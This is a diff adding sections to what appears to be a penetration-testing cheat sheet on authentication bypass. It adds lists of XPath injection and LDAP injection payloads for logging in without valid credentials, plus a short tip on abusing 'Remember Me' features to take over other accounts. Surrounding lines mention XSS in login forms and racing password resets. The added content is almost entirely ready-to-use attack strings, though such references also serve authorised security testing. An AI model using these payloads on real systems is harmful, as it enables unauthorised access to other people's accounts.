@@ -427,6 +427,43 @@ Host: target.com
 - Generated based on the email of the user
 - Generated based on the name of the user
 ```
+## XPath Injection authentication bypass
+```sql
+' or '1'='1
+' or ''='
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+```
+
+## LDAP Injection authentication bypass
+```sql
+*
+*)(&
+*)(|(&
+pwd)
+*)(|(*
+*))%00
+admin)(&)
+pwd
+admin)(!(&(|
+pwd))
+admin))(|(|
+```
+
+## Remember Me
+If the page has "Remember Me" functionality check how is it implemented and see if you can abuse it to takeover other accounts.
+
+
+
 
 1. Try Cross-Site Scripting (XSS) in the form
 2. send victim reset password and attacker reset password with Race Condition 
